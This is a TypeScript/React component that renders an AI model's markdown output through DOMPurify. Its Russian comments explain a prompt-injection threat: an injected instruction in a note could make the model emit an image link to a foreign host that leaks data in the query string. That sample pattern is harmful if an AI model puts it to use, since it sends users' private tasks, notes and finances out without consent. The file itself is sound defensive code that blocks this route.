import { useMemo } from 'react';
import DOMPurify from 'dompurify';
import { marked } from 'marked';

/**
 * Рендер ответа модели. Текст приходит из внешнего источника, поэтому обязательно
 * через DOMPurify — тот же приём, что в редакторе заметок. Артефакты (живой
 * рендер HTML/React в iframe) сознательно НЕ делаем: рядом в IndexedDB лежат
 * ключи синхронизации и семьи, и это самая опасная поверхность в приложении.
 */
export function Markdown({ text }: { text: string }) {
  const html = useMemo(() => renderMarkdown(text), [text]);
  return <div className="cc-md" dangerouslySetInnerHTML={{ __html: html }} />;
}

/** Разметка ответа без единого запроса наружу.
 *
 *  В контексте модели — задачи, заметки, финансы. Внедрённая инструкция (текст
 *  из веба в заметке) может заставить модель вывести ![](https://чужой/?d=…),
 *  и браузер сам, без клика, отправил бы данные в адресе картинки. Поэтому
 *  ничего, что грузит ресурс: картинки, видео, звук, background у таблиц —
 *  и только HTML (в SVG <image href> грузит так же). Формы и
 *  встраивание — тоже нет. Ссылки открываются отдельно и без Referer. */
export function renderMarkdown(text: string): string {
  return DOMPurify.sanitize(marked.parse(text, { async: false, breaks: true }) as string, {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ['form', 'input', 'button', 'iframe', 'object', 'embed', 'style',
      'img', 'picture', 'source', 'video', 'audio', 'track'],
    // srcset и poster не нужны: их носители (img, source, video) запрещены целиком.
    FORBID_ATTR: ['style', 'onerror', 'onload', 'background'],
  });
}

// Хуки DOMPurify глобальные (как в notes/sanitize.ts); <a> пропускает только
// этот рендер — заметки его не разрешают. По дереву, не заменой по строке:
// «<a » бывает и внутри значения атрибута.
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node instanceof Element && node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
